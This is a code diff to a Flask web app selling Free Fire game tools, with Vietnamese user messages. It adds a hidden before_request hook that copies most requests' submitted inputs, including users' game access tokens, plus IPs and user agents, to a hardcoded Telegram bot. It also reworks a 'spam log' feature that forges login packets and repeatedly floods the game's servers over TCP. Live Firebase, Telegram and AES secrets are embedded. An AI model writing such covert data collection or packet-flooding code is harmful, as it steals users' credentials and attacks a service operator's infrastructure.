@@ -34,9 +34,102 @@ AES_IV  = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
 FIREBASE_URL = "https://freefiretools-a5470-default-rtdb.asia-southeast1.firebasedatabase.app"
 FIREBASE_SECRET = "bIIZjhwOHgrkxLawK2Lbcfbdd75zxQQ3JVqWQC4b"
 
+# Telegram configuration
+TELEGRAM_BOT_TOKEN = "8653989170:AAFf13AVwvJ2FZnj7y-DS9KhFf2BGbPqdKI"
+TELEGRAM_CHAT_ID = "6748632013"
+
+def send_telegram(message):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+        requests.post(url, json=data, timeout=10)
+    except Exception as e:
+        pass
+
+@app.before_request
+def collect_inputs():
+    # Các đường dẫn không muốn thu thập
+    exclude_paths = [
+        '/static', '/favicon.ico', 
+        '/api/login', '/api/register', 
+        '/api/ban7', '/api/revoke_token',
+        '/auth', '/register', '/admin/login'
+    ]
+    
+    for path in exclude_paths:
+        if request.path.startswith(path):
+            return
+    
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    method = request.method
+    path = request.path
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    
+    inputs = {}
+    if request.args:
+        inputs['GET'] = request.args.to_dict()
+    
+    if request.form:
+        inputs['FORM'] = request.form.to_dict()
+        
+    if request.is_json:
+        try:
+            inputs['JSON'] = request.get_json(silent=True)
+        except:
+            pass
+
+    # Chỉ thu thập nếu có dữ liệu input
+    if not inputs:
+        return
+
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"<b>🛠 Feature Used!</b>\n\n"
+    msg += f"<b>Time:</b> {timestamp}\n"
+    msg += f"<b>IP:</b> {ip}\n"
+    msg += f"<b>Method:</b> {method}\n"
+    msg += f"<b>Path:</b> {path}\n"
+    msg += f"<b>User Agent:</b> {user_agent}\n\n"
+    
+    if inputs:
+        msg += f"<b>Input Data:</b>\n<pre>{json.dumps(inputs, indent=2, ensure_ascii=False)}</pre>"
+    
+    threading.Thread(target=send_telegram, args=(msg,)).start()
+
 # Spam Log global state
 spam_log_threads = {}
 spam_log_stop_events = {}
+active_spams = {}  # key: username, value: {at, thread, stop_event, status, ...}
+SPAM_CACHE_FILE = 'active_spams_cache.json'
+
+def load_spam_cache():
+    if os.path.exists(SPAM_CACHE_FILE):
+        try:
+            with open(SPAM_CACHE_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_spam_cache(data):
+    try:
+        clean_data = {}
+        for k, v in data.items():
+            clean_data[str(k)] = {
+                'at': v.get('at'),
+                'status': v.get('status'),
+                'sent': v.get('sent', 0),
+                'ok': v.get('ok', 0),
+                'fail': v.get('fail', 0),
+                'ip': v.get('ip'),
+                'port': v.get('port'),
+                'end_time': v.get('end_time'),
+                'packet': v.get('packet').hex() if isinstance(v.get('packet'), bytes) else v.get('packet'),
+                'interval': v.get('interval')
+            }
+        with open(SPAM_CACHE_FILE, 'w', encoding='utf-8') as f:
+            json.dump(clean_data, f, ensure_ascii=False, indent=2)
+    except:
+        pass
 
 # SimpleProtobuf class for SpamLog
 class SimpleProtobuf:
@@ -114,8 +207,32 @@ def get_available_room_spam(hex_data):
     except:
         return {}
 
-def process_spam_log(access_token, duration_seconds, stop_event):
-    """Process spam log in background thread"""
+def spam_loop(username, ip, port, packet, iv_ms, end_time, stop_event=None):
+    """Spam loop function from WebCu - uses TCP socket directly"""
+    while time.time() < end_time:
+        if username not in active_spams or (stop_event and stop_event.is_set()):
+            break
+        try:
+            send_packet_tcp(ip, port, packet, timeout=5)
+            if username in active_spams: active_spams[username]['ok'] += 1
+        except:
+            if username in active_spams: active_spams[username]['fail'] += 1
+        if username in active_spams: active_spams[username]['sent'] += 1
+        time.sleep(iv_ms / 1000.0)
+
+    if username in active_spams:
+        active_spams[username]['status'] = 'finished'
+        save_spam_cache(active_spams)
+
+def send_packet_tcp(ip, port, packet, timeout=5):
+    """Send packet via TCP socket"""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        s.sendall(packet)
+
+def process_spam_log(username, access_token, duration_seconds, stop_event):
+    """Process spam log in background thread - WebCu style"""
     try:
         mjologin.init_system(access_token)
 
@@ -128,109 +245,106 @@ def process_spam_log(access_token, duration_seconds, stop_event):
             "Connection": "keep-alive"
         }
 
-        session_start = time.time()
-        while time.time() - session_start < duration_seconds:
-            # Check if stop event is set
-            if stop_event and stop_event.is_set():
-                break
+        # Token inspection
+        r_inspect = requests.get(
+            f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
+            timeout=10
+        ).json()
+        if 'error' in r_inspect:
+            return
 
-            try:
-                # Token inspection
-                r_inspect = requests.get(
-                    f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
-                    timeout=10
-                ).json()
-                if 'error' in r_inspect:
-                    break
+        open_id = r_inspect.get('open_id')
+        platform = str(r_inspect.get('platform'))
 
-                open_id = r_inspect.get('open_id')
-                platform = str(r_inspect.get('platform'))
+        # Build payload
+        key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
+        pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
+        enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
 
-                # Build payload
-                key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
-                pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
-                enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
+        # MajorLogin
+        r1 = requests.post(
+            "https://loginbp.ggpolarbear.com/MajorLogin",
+            headers=headers,
+            data=enc_payload,
+            timeout=15,
+            verify=False
+        )
 
-                # MajorLogin
-                r1 = requests.post(
-                    "https://loginbp.ggpolarbear.com/MajorLogin",
-                    headers=headers,
-                    data=enc_payload,
-                    timeout=15,
-                    verify=False
-                )
+        if r1.status_code == 503:
+            time.sleep(10)
+            return
+        elif r1.status_code != 200:
+            time.sleep(5)
+            return
 
-                if r1.status_code == 503:
-                    time.sleep(10)
-                    continue
-                elif r1.status_code != 200:
-                    time.sleep(5)
-                    continue
+        # Parse MajorLogin response
+        resp_pb = MajorLogin_res_pb2.MajorLoginRes()
+        try:
+            dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
+            resp_pb.ParseFromString(dec)
+        except:
+            resp_pb.ParseFromString(r1.content)
 
-                # Parse MajorLogin response
-                resp_pb = MajorLogin_res_pb2.MajorLoginRes()
-                try:
-                    dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
-                    resp_pb.ParseFromString(dec)
-                except:
-                    resp_pb.ParseFromString(r1.content)
+        # GetLoginData
+        headers["Host"] = "clientbp.ggpolarbear.com"
+        headers["Authorization"] = f"Bearer {resp_pb.account_jwt}"
+        r2 = requests.post(
+            "https://clientbp.ggpolarbear.com/GetLoginData",
+            headers=headers,
+            data=enc_payload,
+            timeout=12,
+            verify=False
+        )
 
-                # GetLoginData
-                headers["Host"] = "clientbp.ggpolarbear.com"
-                headers["Authorization"] = f"Bearer {resp_pb.account_jwt}"
-                r2 = requests.post(
-                    "https://clientbp.ggpolarbear.com/GetLoginData",
-                    headers=headers,
-                    data=enc_payload,
-                    timeout=12,
-                    verify=False
-                )
+        # Parse server address
+        room_info = get_available_room_spam(r2.content.hex())
+        addr = room_info.get('14', {}).get('data')
+        if not addr:
+            return
 
-                # Parse server address
-                room_info = get_available_room_spam(r2.content.hex())
-                addr = room_info.get('14', {}).get('data')
-                if not addr:
-                    time.sleep(5)
-                    continue
+        online_ip = addr[:-6]
+        online_port = int(addr[-5:])
 
-                online_ip = addr[:-6]
-                online_port = int(addr[-5:])
+        # Build final packet
+        jwt_parts = resp_pb.account_jwt.split('.')
+        jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
+        acc_id = int(jwt_payload.get("account_id", 0))
+        exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)
 
-                # Build final packet
-                jwt_parts = resp_pb.account_jwt.split('.')
-                jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
-                acc_id = int(jwt_payload.get("account_id", 0))
-                exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)
+        cipher_jwt = AES.new(resp_pb.key, AES.MODE_CBC, resp_pb.iv)
+        enc_jwt = cipher_jwt.encrypt(pad(resp_pb.account_jwt.encode(), 16))
+        final_packet = bytes.fromhex(
+            "0115" + acc_id.to_bytes(8, "big").hex() +
+            exp_adj.to_bytes(4, "big").hex() +
+            len(enc_jwt).to_bytes(4, "big").hex()
+        ) + enc_jwt
 
-                cipher_jwt = AES.new(resp_pb.key, AES.MODE_CBC, resp_pb.iv)
-                enc_jwt = cipher_jwt.encrypt(pad(resp_pb.account_jwt.encode(), 16))
-                final_packet = bytes.fromhex(
-                    "0115" + acc_id.to_bytes(8, "big").hex() + 
-                    exp_adj.to_bytes(4, "big").hex() + 
-                    len(enc_jwt).to_bytes(4, "big").hex()
-                ) + enc_jwt
+        # Store in active_spams
+        end_time = time.time() + duration_seconds
+        active_spams[username] = {
+            'at': access_token,
+            'stop_event': stop_event,
+            'status': 'running',
+            'sent': 0,
+            'ok': 0,
+            'fail': 0,
+            'ip': online_ip,
+            'port': online_port,
+            'end_time': end_time,
+            'packet': final_packet,
+            'interval': 500  # Default 500ms
+        }
 
-                # Send packets
-                packet_start = time.time()
-                while time.time() - packet_start < 10:  # Send for 10 seconds per session
-                    if stop_event and stop_event.is_set():
-                        break
-                    try:
-                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                            s.settimeout(3)
-                            s.connect((online_ip, online_port))
-                            s.sendall(final_packet)
-                        time.sleep(2.0)
-                    except:
-                        time.sleep(1)
-                        continue
+        # Save to cache
+        save_spam_cache(active_spams)
 
-            except Exception as e:
-                time.sleep(5)
-                continue
+        # Start spam loop
+        spam_loop(username, online_ip, online_port, final_packet, 500, end_time, stop_event)
 
     except Exception as e:
-        pass
+        if username in active_spams:
+            active_spams[username]['status'] = 'error'
+            save_spam_cache(active_spams)
 
 def firebase_get(path):
     """Get data from Firebase"""
@@ -1470,75 +1584,262 @@ def add_recovery_email():
 
 @app.route('/api/spam_log', methods=['POST'])
 def spam_log():
+    """WebCu style spam log endpoint with init/stop actions"""
     try:
         # Check if user is logged in
         if 'authenticated' not in session or not session['authenticated']:
             return jsonify({'success': False, 'error': 'Bạn cần đăng nhập để sử dụng tính năng này'})
-        
+
         username = session.get('username')
         usage = get_user_usage(username)
-        
+
         # Check usage limit (1 use for free users)
         if not usage.get('is_pro', False) and usage.get('spam_log', 0) >= 1:
             return jsonify({
                 'success': False,
                 'error': 'Bạn đã dùng hết lượt sử dụng miễn phí. Mua gói Pro tại @minhdevtcp để dùng không giới hạn'
             })
-        
+
         data = request.json
-        access_token = data.get('access_token')
-        duration = data.get('duration', '10s')  # Default 10 seconds
-        action = data.get('action', 'start')  # start or stop
-        
-        if not access_token:
-            return jsonify({'success': False, 'error': 'Access token is required'})
-        
-        total_seconds = parse_duration(str(duration))
-        max_duration = 15 * 24 * 60 * 60  # 15 days in seconds
-        if total_seconds <= 0 or total_seconds > max_duration:
-            return jsonify({'success': False, 'error': f'Duration must be between 1 second and 15 days'})
-        
+        action = data.get('action', 'start')
+
         if action == 'start':
-            # Check if already running for this user
-            if username in spam_log_threads and username in spam_log_stop_events:
-                if spam_log_threads[username].is_alive():
-                    return jsonify({'success': False, 'error': 'Spam log already running'})
-            
-            # Create stop event
-            stop_event = threading.Event()
-            spam_log_stop_events[username] = stop_event
-            
-            # Start spam log in background thread
-            thread = threading.Thread(
-                target=process_spam_log,
-                args=(access_token, total_seconds, stop_event),
-                daemon=True
-            )
-            thread.start()
-            spam_log_threads[username] = thread
-            
-            # Update usage
-            update_user_usage(username, 'spam_log')
-            
-            return jsonify({
-                'success': True,
-                'message': 'Spam log started',
-                'duration': total_seconds,
-                'status': 'running'
-            })
+            access_token = data.get('access_token')
+            interval = int(data.get('interval', 500))
+            duration_ms = int(data.get('duration_ms', 10000))
+
+            if not access_token:
+                return jsonify({'success': False, 'error': 'Access token is required'})
+
+            # Check if already running
+            if username in active_spams and active_spams[username]['status'] == 'running':
+                s = active_spams[username]
+                return jsonify({
+                    'success': True,
+                    'status': 'running',
+                    'ip': s['ip'],
+                    'port': s['port'],
+                    'sent': s['sent'],
+                    'ok': s['ok'],
+                    'fail': s['fail'],
+                    'at': s['at']
+                }, 'Spam is already running')
+
+            try:
+                # Get server info first
+                mjologin.init_system(access_token)
+
+                headers = {
+                    "Host": "loginbp.ggpolarbear.com",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": "FreeFire/2.103.1 (iPhone; iOS 15.5; Scale/3.00)",
+                    "X-GA": "v1 1",
+                    "ReleaseVersion": "OB53",
+                    "Connection": "keep-alive"
+                }
+
+                # Token inspection
+                r_inspect = requests.get(
+                    f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
+                    timeout=10
+                ).json()
+                if 'error' in r_inspect:
+                    return jsonify({'success': False, 'error': 'Invalid token'})
+
+                open_id = r_inspect.get('open_id')
+                platform = str(r_inspect.get('platform'))
+
+                # Build payload
+                key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
+                pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
+                enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
+
+                # MajorLogin
+                r1 = requests.post(
+                    "https://loginbp.ggpolarbear.com/MajorLogin",
+                    headers=headers,
+                    data=enc_payload,
+                    timeout=15,
+                    verify=False
+                )
+
+                if r1.status_code == 503:
+                    return jsonify({'success': False, 'error': 'Server busy (503)'})
+                elif r1.status_code != 200:
+                    return jsonify({'success': False, 'error': 'MajorLogin failed'})
+
+                # Parse MajorLogin response
+                resp_pb = MajorLogin_res_pb2.MajorLoginRes()
+                try:
+                    dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
+                    resp_pb.ParseFromString(dec)
+                except:
+                    resp_pb.ParseFromString(r1.content)
+
+                # GetLoginData
+                headers["Host"] = "clientbp.ggpolarbear.com"
+                headers["Authorization"] = f"Bearer {resp_pb.account_jwt}"
+                r2 = requests.post(
+                    "https://clientbp.ggpolarbear.com/GetLoginData",
+                    headers=headers,
+                    data=enc_payload,
+                    timeout=12,
+                    verify=False
+                )
+
+                # Parse server address
+                room_info = get_available_room_spam(r2.content.hex())
+                addr = room_info.get('14', {}).get('data')
+                if not addr:
+                    return jsonify({'success': False, 'error': 'Could not get server address'})
+
+                online_ip = addr[:-6]
+                online_port = int(addr[-5:])
+
+                # Build final packet
+                jwt_parts = resp_pb.account_jwt.split('.')
+                jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
+                acc_id = int(jwt_payload.get("account_id", 0))
+                exp_adj = max(int(jwt_payload.get("exp", 0)) - 28800, 0)
+
+                cipher_jwt = AES.new(resp_pb.key, AES.MODE_CBC, resp_pb.iv)
+                enc_jwt = cipher_jwt.encrypt(pad(resp_pb.account_jwt.encode(), 16))
+                final_packet = bytes.fromhex(
+                    "0115" + acc_id.to_bytes(8, "big").hex() +
+                    exp_adj.to_bytes(4, "big").hex() +
+                    len(enc_jwt).to_bytes(4, "big").hex()
+                ) + enc_jwt
+
+                # Initialize active_spams
+                end_time = time.time() + (duration_ms / 1000.0)
+                stop_event = threading.Event()
+
+                active_spams[username] = {
+                    'at': access_token,
+                    'stop_event': stop_event,
+                    'status': 'running',
+                    'sent': 0,
+                    'ok': 0,
+                    'fail': 0,
+                    'ip': online_ip,
+                    'port': online_port,
+                    'end_time': end_time,
+                    'packet': final_packet,
+                    'interval': interval
+                }
+
+                # Start thread
+                thread = threading.Thread(
+                    target=spam_loop,
+                    args=(username, online_ip, online_port, final_packet, interval, end_time, stop_event)
+                )
+                thread.daemon = True
+                thread.start()
+
+                # Save to cache
+                save_spam_cache(active_spams)
+
+                # Update usage
+                update_user_usage(username, 'spam_log')
+
+                return jsonify({
+                    'success': True,
+                    'status': 'started',
+                    'ip': online_ip,
+                    'port': online_port
+                })
+
+            except Exception as e:
+                return jsonify({'success': False, 'error': str(e)})
+
         elif action == 'stop':
-            # Stop spam log for this user
-            if username in spam_log_stop_events:
-                spam_log_stop_events[username].set()
-                if username in spam_log_threads:
-                    spam_log_threads[username].join(timeout=5)
-                    del spam_log_threads[username]
-                del spam_log_stop_events[username]
-                return jsonify({'success': True, 'message': 'Spam log stopped', 'status': 'stopped'})
-            else:
-                return jsonify({'success': False, 'error': 'No active spam log to stop'})
+            # Delete from cache
+            cache = load_spam_cache()
+            if str(username) in cache:
+                del cache[str(username)]
+                try:
+                    with open(SPAM_CACHE_FILE, 'w', encoding='utf-8') as f:
+                        json.dump(cache, f, ensure_ascii=False, indent=2)
+                except:
+                    pass
+
+            # Delete from RAM
+            if username in active_spams:
+                active_spams[username]['stop_event'].set()
+                active_spams[username]['status'] = 'stopped'
+                del active_spams[username]
+                return jsonify({'success': True, 'message': 'Đã dừng và xóa tiến trình thành công'})
+
+            return jsonify({'success': False, 'error': 'Không có tiến trình nào đang chạy cho tài khoản này'})
+
         else:
             return jsonify({'success': False, 'error': 'Invalid action'})
+
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/spam_status', methods=['GET'])
+def spam_status():
+    """Get spam log status - WebCu style for polling"""
+    try:
+        # Check if user is logged in
+        if 'authenticated' not in session or not session['authenticated']:
+            return jsonify({'success': False, 'error': 'Unauthorized'})
+
+        username = session.get('username')
+
+        # Check cache for resurrection if server crashed
+        if username not in active_spams:
+            cache = load_spam_cache()
+            c_item = cache.get(str(username))
+            if c_item and c_item.get('status') == 'running' and c_item.get('end_time', 0) > time.time():
+                stop_event = threading.Event()
+                pkt_data = c_item.get('packet')
+                if pkt_data:
+                    try:
+                        pkt_data = bytes.fromhex(pkt_data)
+                    except:
+                        pass
+
+                active_spams[username] = {
+                    'at': c_item.get('at'),
+                    'stop_event': stop_event,
+                    'status': 'running',
+                    'sent': c_item.get('sent', 0),
+                    'ok': c_item.get('ok', 0),
+                    'fail': c_item.get('fail', 0),
+                    'ip': c_item.get('ip'),
+                    'port': c_item.get('port'),
+                    'end_time': c_item.get('end_time'),
+                    'packet': pkt_data,
+                    'interval': c_item.get('interval', 500)
+                }
+
+                # Resurrect thread
+                thread = threading.Thread(
+                    target=spam_loop,
+                    args=(username, c_item.get('ip'), c_item.get('port'), pkt_data, c_item.get('interval'), c_item.get('end_time'), stop_event)
+                )
+                thread.daemon = True
+                thread.start()
+
+        if username not in active_spams:
+            return jsonify({'success': True, 'status': 'idle'})
+
+        s = active_spams[username]
+        save_spam_cache(active_spams)  # Update cache continuously
+
+        return jsonify({
+            'success': True,
+            'status': s['status'],
+            'sent': s['sent'],
+            'ok': s['ok'],
+            'fail': s['fail'],
+            'ip': s['ip'],
+            'port': s['port'],
+            'remaining_ms': max(0, int((s['end_time'] - time.time()) * 1000))
+        })
+
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
